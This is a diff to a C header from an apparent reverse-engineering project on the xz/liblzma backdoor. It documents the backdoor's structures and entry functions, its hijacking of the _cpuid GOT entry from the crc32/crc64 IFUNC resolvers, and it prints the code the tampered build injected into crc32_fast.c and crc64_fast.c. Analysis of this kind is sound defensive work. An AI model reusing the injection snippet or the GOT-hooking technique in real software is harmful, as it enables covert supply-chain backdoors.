@@ -11,6 +11,7 @@
 #include <assert.h>
 #include <stddef.h>
 #include <stdint.h>
+#include <sys/select.h>
 #endif
 
 #ifndef XZRE_SLIM
@@ -49,9 +50,8 @@ typedef struct {
 #include <openssl/rsa.h>
 #include <elf.h>
 #include <link.h>
-#endif
-
 typedef Elf64_Xword Elf64_Relr;
+#endif
 
 #define UPTR(x) ((uptr)(x))
 #define PTRADD(a, b) (UPTR(a) + UPTR(b))
@@ -309,7 +309,7 @@ typedef struct __attribute__((packed)) {
 	 * @brief holds the offset of the symbol relative to the GOT.
 	 * used to derive the @ref got_ptr
 	 */
-	u64 got_offset;
+	ptrdiff_t got_offset;
 	/**
 	 * @brief stores the value of __builtin_frame_address(0)-16
 	 */
@@ -701,6 +701,7 @@ typedef struct __attribute__((packed)) {
 } backdoor_shared_globals_t;
 
 assert_offset(backdoor_shared_globals_t, globals, 0x10);
+static_assert(sizeof(backdoor_shared_globals_t) == 0x18);
 
 typedef struct __attribute__((packed)) {
 	PADDING(0x70);
@@ -750,10 +751,22 @@ typedef struct __attribute__((packed)) {
 		unsigned int flags, const char *symname);
 	pfn_RSA_public_decrypt_t hook_RSA_public_decrypt;
 	pfn_RSA_get0_key_t hook_RSA_get0_key;
+	/**
+	 * @brief 
+	 * set to addess of symbol .Llzma12_mode_map_part_1
+	 */
 	PADDING(sizeof(void *));
 	PADDING(sizeof(void *));
 	PADDING(sizeof(void *));
+	/**
+	 * @brief 
+	 * set to addess of symbol .Lfile_info_decode_0
+	 */
 	PADDING(sizeof(void *));
+	/**
+	 * @brief 
+	 * set to addess of symbol .Lbt_skip_func_part_0
+	 */
 	PADDING(sizeof(void *));
 	PADDING(sizeof(void *));
 } backdoor_hooks_ctx_t;
@@ -1036,6 +1049,32 @@ assert_offset(key_ctx_t, rsa_e, 0x8);
 assert_offset(key_ctx_t, args, 0x10);
 assert_offset(key_ctx_t, payload, 0x15);
 static_assert(sizeof(key_ctx_t) == 0x2B8);
+
+typedef struct __attribute__((packed)) {
+	/**
+	 * @brief offset from the symbol .Lrc_read_destroy to the GOT
+	 * 
+	 * the field maps to a relation entry of type R_X86_64_GOTOFF64 and value .Lrc_read_destroy
+	 */
+	ptrdiff_t rc_read_destroy_got_offset;
+	/**
+	 * @brief index in the GOT for _cpuid()
+	 * 
+	 * the field maps to a relation entry of type R_X86_64_GOT64 and value _cpuid
+	 */
+	u64 cpuid_got_index;
+	/**
+	 * @brief offset from the symbol backdoor_init_stage2() to the GOT
+	 * 
+	 * the field maps to a relation entry of type R_X86_64_GOTOFF64 and value backdoor_init_stage2
+	 */
+	ptrdiff_t backdoor_init_stage2_got_offset;
+} backdoor_cpuid_reloc_consts_t;
+
+assert_offset(backdoor_cpuid_reloc_consts_t, rc_read_destroy_got_offset, 0);
+assert_offset(backdoor_cpuid_reloc_consts_t, cpuid_got_index, 0x8);
+assert_offset(backdoor_cpuid_reloc_consts_t, backdoor_init_stage2_got_offset, 0x10);
+static_assert(sizeof(backdoor_cpuid_reloc_consts_t) == 0x18);
 
 /**
  * @brief disassembles the given x64 code
@@ -1461,8 +1500,81 @@ extern BOOL secret_data_append_from_call_site(
  */
 extern BOOL backdoor_setup(backdoor_setup_params_t *params);
 
-extern void backdoor_init(elf_entry_ctx_t *ctx, u64 *caller_frame);
-extern BOOL backdoor_init_stage2(elf_entry_ctx_t *ctx);
+/**
+ * @brief calls call_backdoor_init_stage2() while in the crc64() IFUNC resolver function
+ * 
+ * the function counts the number of times it was called in resolver_call_count
+ * 
+ * the first time it is called is in the crc32() resolver just returns the maximum supported cpuid level
+ * 
+ * the second time it is called is in the crc64() resolver and then this function calls call_backdoor_init_stage2()
+ * 
+ * this is a modified version of __get_cpuid_max() from gcc
+ * 
+ * @param ext EAX register input. Is either 0 or 0x80000000, but this value is actually not used.
+ * @param caller_frame the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver
+ * @return unsigned int the EAX register output. Normally the maximum supported cpuid level.
+ */
+extern unsigned int backdoor_init(unsigned int ext, u64 *caller_frame);
+
+/**
+ * @brief calls backdoor_init_stage2()
+ * 
+ * backdoor_init_stage2() is called by replacing the _cpuid() GOT entry to point to backdoor_init_stage2()
+ * 
+ * stores elf_entry_ctx_t::symbol_ptr - elf_entry_ctx_t::got_offset in elf_entry_ctx_t::got_ptr which is the GOT address 
+ * 
+ * @param ctx holds values needed to setup the _cpuid(), passed to backdoor_init_stage2()
+ * @param caller_frame the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver
+ * @return void * the value elf_entry_ctx_t::got_ptr if the cpuid() GOT entry was NULL, otherwise the return value of backdoor_init_stage2()
+ */
+extern void *call_backdoor_init_stage2(elf_entry_ctx_t *ctx, u64 *caller_frame);
+
+/**
+ * @brief initialises the elf_entry_ctx_t
+ * 
+ * stores the address of the symbol random_symbol in elf_entry_ctx_t::symbol_ptr
+ * stores the return address of the function that called the IFUNC resolver which is a stack address in ld.so
+ * calls get_got_offset() to update elf_entry_ctx_t::got_offset 
+ * calls get_cpuid_got_index() to update elf_entry_ctx_t::cpuid_fn
+ * 
+ * @param ctx
+ * @return ptrdiff_t always 0
+ */
+extern ptrdiff_t init_elf_entry_ctx(elf_entry_ctx_t *ctx);
+
+/**
+ * @brief get the offset to the GOT
+ * 
+ * the offset is relative to the address of the symbol random_symbol
+ * 
+ * stores the offset in elf_entry_ctx_t::got_offset
+ * 
+ * @param ctx
+ * @return ptrdiff_t offset to GOT from the symbol random_symbol
+ */
+extern ptrdiff_t get_got_offset(elf_entry_ctx_t *ctx);
+
+/**
+ * @brief get the cpuid() GOT index
+ * 
+ * stores the index in elf_entry_ctx_t::cpuid_fn
+ * 
+ * @param ctx
+ * @return u64 cpuid() GOT index
+ */
+extern u64 get_cpuid_got_index(elf_entry_ctx_t *ctx);
+
+/**
+ * @brief
+ * 
+ * @param ctx holds values needed to setup the _cpuid(), passed to backdoor_init_stage2()
+ * @param caller_frame stores the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver
+ * @param cpuid_got_addr address of the cpuid() GOT entry
+ * @param reloc_consts pointer to backdoor_cpuid_reloc_consts
+ * @return BOOL the value elf_entry_ctx_t::got_ptr if the cpuid() GOT entry was NULL, otherwise the return value of backdoor_init_stage2()
+ */
+extern BOOL backdoor_init_stage2(elf_entry_ctx_t *ctx, u64 *caller_frame, void **cpuid_got_addr, backdoor_cpuid_reloc_consts_t* reloc_consts);
 
 /**
  * @brief parses the libc ELF from the supplied link map, and resolves its imports
@@ -1545,15 +1657,63 @@ extern BOOL is_range_mapped(u8* addr, u8 length, global_context_t* ctx);
 extern EncodedStringId get_string_id(const char *string_begin, const char *string_end);
 
 /**
- * @brief the backdoor entrypoint function, called by the IFUNC resolver
+ * @brief the backdoor entrypoint function, called by the IFUNC resolver for liblzma crc32() and crc64()
  * 
- * @param cpuid_request 
- * @return BOOL 
+ * calls backdoor_init()
+ * 
+ * this is a copy of __get_cpuid() from gcc
+ * 
+ * for context this is the extra code the backdoor build inserts into both xz/src/liblzma/check/crc32_fast.c and xz/src/liblzma/check/crc64_fast.c
+ * \code{.c}
+ * #if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))
+ * int _get_cpuid(int, void*, void*, void*, void*, void*);
+ *
+ * static inline bool _is_arch_extension_supported(void) {
+ *   int success = 1;
+ *   uint32_t r[4];
+ *   success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16);
+ *   const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19);
+ *   return success && (r[2] & ecx_mask) == ecx_mask;
+ * }
+ * 
+ * #else
+ * #define _is_arch_extension_supported() is_arch_extension_supported
+ * #endif 
+ * \endcode
+ * 
+ * the _get_cpuid() function is defined in the file liblzma_la-crc64-fast.o which is linked into liblzma to bring in the backdoor's code
+ * 
+ * the _is_arch_extension_supported is a modified version of is_arch_extension_supported() from xz/src/liblzma/check/crc_x86_clmul.h
+ * 
+ * additionally both xz/src/liblzma/check/crc32_fast.c and xz/src/liblzma/check/crc64_fast.c are modified to replace the call to is_arch_extension_supported() with _is_arch_extension_supported()
+ * 
+ * @param leaf EAX register input for cpuid instruction
+ * @param eax EAX register output for cpuid instruction
+ * @param ebx EBX register output for cpuid instruction
+ * @param ecx ECX register output for cpuid instruction
+ * @param edx EDX register output for cpuid instruction
+ * @param caller_frame the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver
+ * @return BOOL TRUE if cpuid leaf supported, FALSE otherwise
  */
-extern BOOL _get_cpuid(int cpuid_request, void*, void*, void*, void*, void*);
+extern unsigned int _get_cpuid(unsigned int leaf, unsigned int *eax, unsigned int *ebx,  unsigned int *ecx, unsigned int *edx, u64 *caller_frame);
+
+/**
+ * @brief actually calls cpuid instruction
+ * 
+ * this is a copy of __cpuid() from gcc
+ * 
+ * @param level EAX register input for cpuid instruction
+ * @param a EAX register output for cpuid instruction
+ * @param b EBX register output for cpuid instruction
+ * @param c ECX register output for cpuid instruction
+ * @param d EDX register output for cpuid instruction
+ */
+extern void _cpuid(unsigned int level, unsigned int *a, unsigned int *b,  unsigned int *c, unsigned int *d);
 
 /**
  * @brief Initializes the structure with hooks-related data
+ * 
+ * Grabs the call addresses of the internal functions that will be installed into the hook locations.
  * 
  * @param funcs 
  * @return int 
@@ -1585,10 +1745,32 @@ extern uintptr_t backdoor_symbind64(
 	unsigned int flags,
 	const char *symname);
 
+/**
+ * @brief counts the number of times the IFUNC resolver is called
+ * 
+ * used by backdoor_init()
+ * 
+ */
 extern u32 resolver_call_count;
 extern global_context_t *global_ctx;
 extern lzma_allocator *fake_lzma_allocator;
 extern backdoor_hooks_data_t **hooks_data_addr;
+/**
+ * @brief a bogus global variable that is used by the backdoor to generate an extra symbol
+ * 
+ * the symbol is used by init_elf_entry_ctx() and get_got_offset()
+ * 
+ */
+extern const u64 random_symbol;
+/**
+ * @brief special section that contains _cpuid() related GOT offsets
+ * 
+ * liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets
+ * 
+ * used by call_backdoor_init_stage2(), get_got_offset() and get_cpuid_got_index()
+ * 
+ */
+extern backdoor_cpuid_reloc_consts_t backdoor_cpuid_reloc_consts;
 
 #include "util.h"
 #endif
